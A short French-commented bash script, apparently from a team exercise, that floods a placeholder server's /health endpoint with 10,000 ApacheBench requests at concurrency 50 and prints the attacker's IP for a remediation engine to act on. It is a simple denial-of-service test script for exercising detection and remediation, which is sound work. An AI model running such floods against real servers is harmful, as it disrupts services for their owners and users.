#!/bin/bash
# === Script d'attaque flood HTTP - Personne 5 (cyber) ===
CIBLE="http://IP_DU_SERVEUR/health"

echo "Mon IP source (a donner au moteur de remediation) :"
ip a | grep "inet " | grep -v 127.0.0.1

echo ""
echo "=== Debut du flood sur $CIBLE ==="
date
ab -n 10000 -c 50 "$CIBLE"
echo "=== Fin du flood ==="
date
